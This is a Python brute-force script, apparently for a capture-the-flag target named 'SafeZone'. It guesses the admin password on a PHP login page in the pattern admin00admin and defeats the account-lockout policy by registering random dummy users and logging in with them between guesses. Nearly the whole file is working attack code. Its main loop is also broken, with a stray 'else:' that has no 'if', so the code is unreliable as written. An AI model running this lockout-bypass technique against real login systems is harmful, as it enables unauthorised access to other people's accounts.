#!/usr/bin/env python3

#This script takes advantage of the fact that the lockout policy for authentication can be reset by registering a new user and logging in with the new user.

import requests
import random
import time
import argparse

parser = argparse.ArgumentParser(description='SafeZone Brute-Force')
parser.add_argument('-u', help='Target URL (Eg: http://10.10.10.10)', required=True)
args = parser.parse_args()

url = args.u

usernames = []
passwords = []
regPasswords = []
counter = 0

#Generate an array of usernames for dummy accounts
for i in range(0,9999):
	usernames.append(f"user{i}")

#Generate an array of passwords to use for dummy accounts
for d in range(0,9999):
	regPasswords.append(d)

#Generate a password list (We know the format is admin00admin but not the two digit number)
for k in range(0,99):
	origNum = str(k)
	numList = origNum.zfill(2)
	password = f"admin{numList}admin"
	passwords.append(password)

def resetCounter(username, password):	
	regUrl = url + "/register.php"
	logUrl = url + "/index.php"
	data = f"username={username}&password={password}&submit=Submit"
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}

	#Register the dummy account
	r = requests.post(regUrl, data = data, headers = headers)
	time.sleep(0.25)
	
	#Sign-in with the dummy account
	signin = requests.post(logUrl, data = data, headers = headers)
	print("Reset Lockout")

def bruteForce(password):
	logIn = url + "/index.php"
	
	data = f"username=admin&password={password}&submit=Submit"
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}

	brute = requests.post(logIn, data = data, headers = headers)
	if "Please enter valid" in brute.text:
		print(f"Login with {password} failed")
	else:
		print(f"Password found: {password}")
		quit()

resetCounter(random.choice(usernames), random.choice(regPasswords))

while True:
	bruteForce(passwords[counter])
	counter += 1
	bruteForce(passwords[counter])
	counter += 1
	else:
		resetCounter(random.choice(usernames), random.choice(regPasswords))